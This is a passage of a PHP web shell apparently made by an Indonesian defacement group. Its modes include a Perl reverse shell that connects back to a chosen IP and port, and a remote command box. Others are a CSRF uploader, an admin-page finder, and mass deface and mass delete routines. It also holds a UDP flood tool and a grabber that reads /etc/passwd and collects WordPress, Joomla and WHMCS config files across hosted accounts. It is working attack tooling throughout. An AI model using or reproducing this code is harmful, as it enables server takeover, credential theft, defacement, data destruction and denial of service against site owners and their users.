            <input type="submit" name="delete" value=" D e l e t e ">
            <input type="submit" name="update" value=" S a v e ">
         </td></tr>
         <?php
         }
         fclose($handle);
         ?>
      </table>
</form>
<?php
}else{
echo "<br><br><br><font color=red size=3><b><center>".$filename." not exist...</b></font><br><br><br><br><br><br><br>";
echo "<META HTTP-EQUIV=Refresh CONTENT=\"4; URL=javascript:window.close();\">";
}
?>
</center>
<?php
}
}elseif(isset($_POST['Submit'])){
   $ceks = array('base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file');
   foreach($ceks as $ceker){
      if($_POST[$ceker]<>""){
         $six.=$_POST[$ceker].".";
      }
   }
   
$cek = explode('.', $six);

function ListFiles($dir) {
    if($dh = opendir($dir)) {

        $files = Array();
        $inner_files = Array();

        while($file = readdir($dh)) {
            if($file != "." && $file != "..") {
                if(is_dir($dir . "/" . $file)) {
                    $inner_files = ListFiles($dir . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files); 
                } else {
                    array_push($files, $dir . "/" . $file);
                }
            }
        }

        closedir($dh);
        return $files;
    }
}
   ?>
   <center>
   <table border="0" width="90%" cellpadding="5">
      <tr>
         <td align="right" width="30"><b>No</b></td>
         <td align="center" width="105"><b> T y p e </b></td>
         <td align="center"><b> F i l e&nbsp;&nbsp;L o c a t i o n </b></td>
         <td align="center" width="150"><b> L a s t&nbsp;&nbsp;E d i t </b></td>
         <td  align="right" width="80"><b>F i l e&nbsp;&nbsp;S i z e</b></td>
      </tr><br>
<?php
$target=$_SERVER['DOCUMENT_ROOT'];
   foreach (ListFiles($target) as $key=>$file){
      $nFile = substr($file, -4, 4);
      if($nFile == ".php"){
         if($file==$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF']){
         }else{
            $ops = @file_get_contents($file);
            $op=strtolower($ops);
            $arr = array('c99_buff_prepare' => 'c 9 9',
                      'abcr57' => 'r 5 7');
            $sis=0;
            if($op)
            $size=filesize($file);

            $last=date("M-d-Y H:i", $last_modified);
            foreach($arr as $key => $val) {
               if(@preg_match("/$key/", $op)) {
                  $sis=1;
                  $i++;
                  ?>
                  <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
                     <td align="right"><font color="red"><blink><?=$i?></blink></font></td>
                     <td align="center"><font color="red"><blink><?=$val?></blink></font></td>
                     <td align="left"><blink>
                     <a href="#" class="abunai" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$val?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
                     </blink></td>
                     <td align="center"><font color="red"><blink><?=$last?> GMT+9</blink></font></td>
                     <td align="right"><font color="red"><blink><?=$size?> byte</blink></font></td>
                     <script language="javascript">
                        var bgcolor = "transparent";
                        var change_color = "#444444"
                        function mover(aa) {
                           aa.style.backgroundColor = change_color;
                        }
                        function mout(aa) {
                           aa.style.backgroundColor = bgcolor;
                        }
                     </script>
                  </tr>
                  <?php
               }
            }
            if($sis<>"1"){
               if((@preg_match("/system\((.*?)\)/", $op))&&(@preg_match("/<pre>/", $op))&&(@preg_match("/empty\((.*?)\)/", $op))) {
                  $sis="2";
                  $i++;
                  $val="hidden shell";
                  ?>
                  <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
                     <td align="right"><font color="blue"><?=$i?></font></td>
                     <td align="center"><font color="blue"><?=$val?></font></td>
                     <td align="left">
                     <a href="#" class="xxx" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$val?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
                     </td>
                     <td align="center"><font color="blue"><?=$last?> GMT+9</font></td>
                     <td align="right"><font color="blue"><?=$size?> byte</font></td>
                     <script language="javascript">
                        var bgcolor = "transparent";
                        var change_color = "#444444"
                        function mover(aa) {
                           aa.style.backgroundColor = change_color;
                        }
                        function mout(aa) {
                           aa.style.backgroundColor = bgcolor;
                        }
                     </script>
                  </tr>
                  <?php
               }
            }
            if($sis=="0"){
            foreach($cek as $bugs) {
                if ($bugs<>""){
               if(@preg_match("/$bugs\((.*?)\)/", $op)) {
                  $i++;
                  ?>
                  <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
                     <td align="right"><?=$i?></td>
                     <td align="center"><?=$bugs?></td>
                     <td align="left">
                     <a href="#" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$bugs?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
                     </td>
                     <td align="center"><?=$last?> GMT+9</td>
                     <td align="right"><?=$size?> byte</td>
                     <script language="javascript">
                        var bgcolor = "transparent";
                        var change_color = "#444444"
                        function mover(aa) {
                           aa.style.backgroundColor = change_color;
                        }
                        function mout(aa) {
                           aa.style.backgroundColor = bgcolor;
                        }
                     </script>
                  </tr>
                  <?php
               }               
            }
            }
            }
            if($_POST['textV']<>""){
               $text=$_POST['textV'];
                  if(@preg_match("/$text/", $op)) {
                  $i++;
                  ?>
                  <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
                     <td align="right"><?=$i?></td>
                     <td align="center"><?=$text?></td>
                     <td align="left">
                     <a href="#" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$text?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
                     </td>
                     <td align="center"><?=$last?> GMT+9</td>
                     <td align="right"><?=$size?> byte</td>
                     <script language="javascript">
                        var bgcolor = "transparent";
                        var change_color = "#444444"
                        function mover(aa) {
                           aa.style.backgroundColor = change_color;
                        }
                        function mout(aa) {
                           aa.style.backgroundColor = bgcolor;
                        }
                     </script>
                  </tr>
                  <?php
               }
            
            
            }
         }
      }
   }
   if($i==0){
      foreach($cek as $bugs) {
         if ($bugs<>""){
            $x++;
   ?>
      <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
         <td align="right"><?=$x?></td>
         <td align="center"><?=$bugs?></td>
         <td align="center"> not exist </td>
         <td align="center"> no record </td>
         <td align="right"> -&nbsp;&nbsp;&nbsp;&nbsp;byte </td>
      </tr>
   <?php
         }
      }
   }
   ?>
   </table>
   <?php
}else{
   $find = array('default','base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file');
?>
   <form id="fCheck" name="fCheck" method="post" action="" autocomplete="off">
   <center>
   <table class="single" width="400" border="1" -webkit-box-shadow: 0px 0px 15px #55FF55; cellpadding="10">
   <tr><td class="me"><center>
     
      <table class="me" width="200">
         <tr><td class="me">
            <script language="javascript">
               function cekKlik(){   
                  if (!document.fCheck.cekV.checked)
                     document.fCheck.textV.disabled=true;   
                  else 
                     document.fCheck.textV.disabled=false;
                  if(document.fCheck.cekV.checked){
                     master = master + 1;
                  }else{
                     if(master > 0 ){
                        master = master - 1;
                     }else{
                        master = master;
                     }
                  }
                  if(master != 0){
                     document.fCheck.Submit.disabled=false;
                  }else{
                     document.fCheck.Submit.disabled=true;
                  }         
               }     
            </script>  
            <?php
            //dari sini
            foreach($find as $bug) {
            ?>
            <script language="javascript">
               var master = 0;
               function checkValue<?=$bug?>(){
                  if(document.fCheck.<?=$bug?>.checked){
                     master = master + 1;
                  }else{
                     if(master > 0 ){
                        master = master - 1;
                     }else{
                        master = master;
                     }
                  }
                  if(master != 0){
                     document.fCheck.Submit.disabled=false;
                  }else{
                     document.fCheck.Submit.disabled=true;
                  }   
               }
            </script>
            <input onclick="checkValue<?=$bug?>();" name="<?=$bug?>" type="checkbox" id="<?=$bug?>" value="<?=$bug?>" />&nbsp;<?=$bug?><br>
            <?php
            }
            ?>
            <input name="cekV" type="checkbox" onClick="cekKlik();" id="cekV" value="cekV">
            <input class="isi" disabled="disabled" name="textV" value="other key word" onFocus="this.select()" type="text" id="textV">
            <br><br>
            <input type="hidden" name="asal" value="abcd">
            <input disabled="disabled" type="submit" name="Submit" value=" Start " />
         </td></tr>
      </table>
   </td></tr></table>
   </form>
<?php
}
?>
<br><br><hr width="300"> 
<?php
	} elseif($_GET['do'] == 'bconnet') {
		echo '<div id="login" style="margin-top: 10px; margin-left: 10px;">';
		echo '<form action="?page=bcon" method="get"><input type="hidden" name="page" value="bcon"/>';
		echo 'IP:<br><input type="text" name="ip" value="'.getenv("remote_addr").'" style="margin-top: 5px;"/><br><br>';
		echo 'Port:<input type="submit" value="Connect" style="margin-left: 130px; margin-top: -4px;"/><br><input type="text" name="port" value="666" style="margin-top: 5px;"/>';
		echo '</form>';
		echo '</div>';
		if(isset($_GET['ip']) && isset($_GET['port'])){
			$ip = $_GET['ip'];
			$port = $_GET['port'];
			$bc = fopen("/tmp/bxcon.pl","w");
			fwrite($bc,'#!/usr/bin/perl
use Socket;
$iaddr=inet_aton("'.$ip.'") || die("Error: $!\n");
$paddr=sockaddr_in("'.$port.'", $iaddr) || die("Error: $!\n");
$proto=getprotobyname("tcp");
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("/bin/sh -i");
close(STDIN);
close(STDOUT);
close(STDERR);');
			fclose($bc);
			shell_exec("perl /tmp/bxcon.pl");
			unlink("/tmp/bxcon.pl");
		}
	break;



echo '</td>
</tr>
</table>
<br><center>xB1N4RYx ~ 2012</center><br>
</body>
</html>';
function rooting()
{
echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Yuklendi</b><br><br>'; }
	else { echo '<b>Basarisiz</b><br><br>'; }
}
}
$x = $_GET["x"];
Switch($x){
case "rooting";
	rooting();
	break;
	
	}
		} elseif($_GET['do'] == 'about') {
?>
<br>
	<embed src="http://www.youtube.com/v/j_y3i3EHR7E&amp;autoplay=1&amp;loop=1&amp;playlist=besNDPvEwQw" type="application/x-shockwave-flash" wmode="transparent" height="1"width="1"></embed> 
	<div class="terimakasih">
<tr><td><center><font color="gold">No body can give you freedom and nobody can give you equality.
    <br>Jiwa Seorang defacer tetaplah sama :D
    <br><font color="white"> 12-20-2016 - Tangerang</font></font> <br>Create By ShadowHearts<br>Thanks To: MY Friends, And ALL Garuda Security Hacker.<br>Special Greats To My Keyboard.
</td></tr>
 
 
	<?php
} elseif($_GET['do'] == 'csrf') {
?>		<html>
<title>CSRF EXPLOITER ONLINE</title>
<center><br><br><br><br>
<font color=red>*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc 
<center>
<form method="post">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat Diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="d" value="Lock!">
</form>
<?php
//gak penting
     @$url = $_POST['url'];
     @$pf = $_POST['pf'];
     @$d = $_POST['d'];
if($d) {
	//baccod
	
    echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload Cok!'></form";
}
?>
</form>
</html>	
<?php

} elseif($_GET['do'] == 'admf') {
	?>
<type='text/javascript'/></script>
<style>
</style>

</head>
<link rel="SHORTCUT ICON"  href="http://i.imgur.com/2Koa43H.png">
</style>
<br>
<br>
<br>
<td width=100% id=Gretz>
<form action="" method="post">
<center><p class="frontboxtext"><input name="hash_lol" class="textbox" type="text" size="30" value="http://www.target.co.il/"/>
<input name="submit_lol" class="textbox" value="Submit Site" type="submit">
</form>
<?php
set_time_limit(0);
 
if (isset($_POST["submit_lol"])) {
$url = $_POST['hash_lol'];
echo "<br />Crot ".$url."<br /><br />";
 
$adminlocales = array("-adminweb/","!adminweb/","@adminweb/","adminweb121/","adminweb90/","adminweb145/","khususadmin/","rahasiaadm/","adminweb123123/","adminweb2222/","adminlanel/","adminlanel.php/","monitor123.php/","masuk.php/","css.php/", "admin1235.php/", "master.php/","1admin/","123admin/","addmin/","home.php","css/","rediect.php/","masuk.php/","index.php/","webpaneladmin123/","registeradm/","register/","member123/","123adminweb/","123paneladminweb/","panelauth1231/","loginadminweb21/","loginadminweb123/","loginadminweb/","webadmin123/","redakturadmin/","paneladminweb/","admloginadm/","4dm1n/","admin12345/","adminweb12/","adminweb111/","adminweb123/","adminweb1/","gangmasuk/","gangadmin/","admredaktur/","adminwebredaktur/","adminredaktur/","adm/", "_adm_/", "_admin_/", "_loginadm_/", "_login_admin_/", "minmin", "loginadmin3/",  "masuk/admin", "webmail", "_loginadmin_/", "_login_admin.php_/", "_admin_/", "_administrator_/", "operator/", "sika/", "adminweb/", "develop/", "ketua/", "redaktur/", "author/", "admin/", "administrator/", "adminweb/", "user/", "users/", "dinkesadmin/", "retel/", "author/", "panel/", "paneladmin/", "panellogin/", "redaksi/", "cp-admin/", "login@web/", "admin1/", "admin2/", "admin3/", "admin4/", "admin5/", "admin6/", "admin7", "admin8", "admin9", "admin10", "master/", "master/index.php", "master/login.php", "operator/index.php", "sika/index.php", "develop/index.php", "ketua/index.php","redaktur/index.php", "admin/index.php", "administrator/index.php", "adminweb/index.php", "user/index.php", "users/index.php", "dinkesadmin/index.php", "retel/index.php", "author/index.php", "panel/index.php", "paneladmin/index.php", "panellogin/index.php", "redaksi/index.php", "cp-admin/index.php", "operator/login.php", "sika/login.php", "develop/login.php", "ketua/login.php", "redaktur/login.php", "admin/login.php", "administrator/login.php", "adminweb/login.php", "user/login.php", "users/login.php", "dinkesadmin/login.php", "retel/login.php", "author/login.php", "panel/login.php", "paneladmin/login.php", "panellogin/login.php", "redaksi/login.php", "cp-admin/login.php", "terasadmin/", "terasadmin/index.php", "terasadmin/login.php", "rahasia/", "rahasia/index.php", "rahasia/admin.php", "rahasia/login.php", "dinkesadmin/", "dinkesadmin/login.php", "adminpmb/", "adminpmb/index.php", "adminpmb/login.php", "system/", "system/index.php", "system/login.php", "webadmin/", "webadmin/index.php", "webadmin/login.php", "wpanel/", "wpanel/index.php", "wpanel/login.php", "adminpanel/index.php", "adminpanel/", "adminpanel/login.php", "adminkec/", "adminkec/index.php", "adminkec/login.php", "admindesa/", "admindesa/index.php", "admindesa/login.php", "adminkota/", "adminkota/index.php", "adminkota/login.php", "admin123/", "admin123/index.php", "dologin/", "home.asp/","supervise/amdin", "relogin/adm", "checkuser", "relogin.php", "relogin.asp", "wp-admin", "registration", "suvervise", "superman.php", "member.php","home/admin","po-admin/","do_login.php", "bo-login", "bo_login.php/", "index.php/admin", "admiiin.php", "masuk/adm","website_login/", "dashboard/admin", "dashboard.php", "dashboard_adm", "admin123/login.php", "logout1/", "logout/","pengelola/login", "manageradm/", "logout.asp", "manager/adm", "pengelola/web","auth/panel", "logout/index.php", "logout/login.php", "controladm/", "logout/admin.php", "adminweb_setting", "adm/index.asp", "adm.asp", "affiliate.asp", "adm_auth.asp", "memberadmin.asp", "siteadmin/login.asp", "siteadmin/login", "paneldecontrol", "cms/admin", "administracion.php", "/ADMON/", "administrador/", "panelc/", "admincp", "admcp", "cp", "modcp", "moderatorcp", "adminare", "cpanel", "controlpanel");

foreach ($adminlocales as $admin){
$headers = get_headers("$url$admin");
if (eregi('200', $headers[0])) {
    echo "<a href='$url/$admin'>$url$admin</a> Nemu nih!<br />";
}
else {
    echo "$url$admin Gk ketemu!<br />";
}
}
}	
} elseif($_GET['do'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} elseif($_GET['do'] == 'mass_deface') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Garuda Security Hacker</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['do'] == 'ddos') {
?>
<html>
<form action=" " method="post">
<center><br><br><br>
Your IP: <font color="white"><b><?php echo $my_ip; ?></b></font>&nbsp;(Don't DoS yourself nub)<br><br>
<table class="tabnet" style="width:333px;padding:0 1px;">
<th colspan="5">Ddos Tool</th>
<tr><tr><td>IP Target</td><td>:</td>
<td><input type="text" class="inputz" name="ip" size="48" maxlength="25"  value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';"/>
</td></tr>
<tr><td>Time</td><td>:</td>
<td><input type="text" class="inputz" name="time" size="48" maxlength="25"  value = "time (in seconds)" onblur = "if ( this.value=='' ) this.value = 'time (in seconds)';" onfocus = " if ( this.value == 'time (in seconds)' ) this.value = '';"/>
</td></tr>
 
<tr><td>Port</td><td>:</td>
<td><input type="text" class="inputz" name="port" size="48" maxlength="5"  value = "port" onblur = "if ( this.value=='' ) this.value = 'port';" onfocus = " if ( this.value == 'port' ) this.value = '';"/>
</td></tr></tr></table></b><br>
<input type="submit" class="inputzbut" name="fire" value="  Firee !!!   ">
<br><br>
<center>
<font color="white">Seteleh selesai menggunakan tools ini segera refresh browsingmu
</center>
</form>
</center>
<?php
    @$submit = $_POST['fire'];
    if (isset($submit)) {
        $packets = 0;
        $ip = $_POST['ip'];
        $rand = $_POST['port'];
        set_time_limit(0);
        ignore_user_abort(FALSE);
        $exec_time = $_POST['time'];
        $time = time();
        print "Flooded: $ip on port $rand <br><br>";
        $max_time = $time + $exec_time;
        for ($i = 0;$i < 65535;$i++) {
            $out.= "X";
        }
        while (1) {
            $packets++;
            if (time() > $max_time) {
                break;
            }
            $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
            if ($fp) {
                fwrite($fp, $out);
                fclose($fp);
            }
        }
        echo "Packet complete at " . time('h:i:s') . " with $packets (" . round(($packets * 65) / 1024, 2) . " mB) packets averaging " . round($packets / $exec_time, 2) . " packets/s
";
    }	
} elseif($_GET['do'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['do'] == 'config') {
	$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
	$idx = mkdir("idx_config", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("idx_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $user_idx) {
				$user_config_dir = "/home/$user_idx/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
"/home/$user_idx/public_html/vb/includes/config.php" => "Vbulletin.txt",
"/home/$user_idx/public_html/includes/config.php" => "Vbulletin.txt",
"/home/$user_idx/public_html/forum/includes/config.php" => "Vbulletin.txt",
"/home/$user_idx/public_html/forums/includes/config.php" => "Vbulletin.txt",
"/home/$user_idx/public_html/cc/includes/config.php" => "Vbulletin.txt",
"/home/$user_idx/public_html/inc/config.php" => "MyBB.txt",
"/home/$user_idx/public_html/includes/configure.php" => "OsCommerce.txt",
"/home/$user_idx/public_html/shop/includes/configure.php" => "OsCommerce.txt",
"/home/$user_idx/public_html/os/includes/configure.php" => "OsCommerce.txt",
"/home/$user_idx/public_html/oscom/includes/configure.php" => "OsCommerce.txt",
"/home/$user_idx/public_html/products/includes/configure.php" => "OsCommerce.txt",
"/home/$user_idx/public_html/cart/includes/configure.php" => "OsCommerce.txt",
"/home/$user_idx/public_html/inc/conf_global.php" => "IPB.txt",
"/home/$user_idx/public_html/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/wp/test/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/blog/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/beta/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/portal/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/site/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/wp/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/WP/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/news/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/wordpress/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/test/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/demo/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/home/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/v1/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/v2/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/press/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/new/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/blogs/wp-config.php" => "Wordpress.txt",
"/home/$user_idx/public_html/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/blog/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/submitticket.php" => "^WHMCS.txt",
"/home/$user_idx/public_html/cms/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/beta/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/portal/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/site/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/main/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/home/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/demo/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/test/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/v1/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/v2/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/joomla/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/new/configuration.php" => "Joomla.txt",
"/home/$user_idx/public_html/WHMCS/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/whmcs1/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Whmcs/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/WHMC/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Whmc/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/whmc/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/WHM/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Whm/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/whm/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/HOST/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Host/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/host/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/SUPPORTES/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Supportes/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/supportes/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/domains/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/domain/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Hosting/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/HOSTING/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/hosting/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/CART/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Cart/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/cart/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/ORDER/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Order/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/order/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/CLIENT/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Client/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/client/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/CLIENTAREA/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Clientarea/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/SUPPORT/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Support/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/support/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/BILLING/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Billing/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/billing/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/BUY/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Buy/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/buy/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/MANAGE/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Manage/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/manage/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/CLIENTSUPPORT/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/ClientSupport/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Clientsupport/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/clientsupport/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/CHECKOUT/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Checkout/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/checkout/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/BILLINGS/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/Billings/configuration.php" => "WHMCS.txt",
"/home/$user_idx/public_html/billings/configuration.php" => "WHMCS.txt",
